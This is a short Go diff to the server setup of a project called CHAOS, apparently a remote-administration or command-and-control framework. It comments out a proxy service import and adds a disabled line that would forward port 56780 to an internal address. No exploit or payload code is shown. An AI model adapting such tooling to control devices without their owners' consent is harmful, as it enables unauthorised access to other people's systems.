@@ -24,7 +24,8 @@ import (
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"github.com/tiagorlampert/CHAOS/services/client"
 	"github.com/tiagorlampert/CHAOS/services/device"
-	"github.com/tiagorlampert/CHAOS/services/proxy"
+
+	// "github.com/tiagorlampert/CHAOS/services/proxy"
 	"github.com/tiagorlampert/CHAOS/services/url"
 	"github.com/tiagorlampert/CHAOS/services/user"
 	"gorm.io/gorm"
@@ -158,6 +159,9 @@ func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbC
 	deviceService := device.NewDeviceService(deviceRepository)
 	clientService := client.NewClientService(Version, configuration, authRepository, authService)
 	urlService := url.NewUrlService(clientService)
+
+	// proxyService := proxy.NewProxyService()
+	// go proxyService.ProxyUrl(":56780", "http://10.10.10.2")
 
 	if err := userService.CreateDefaultUser(); err != nil {
 		logger.WithField(`cause`, err.Error()).Fatal(`error setting up default user`)
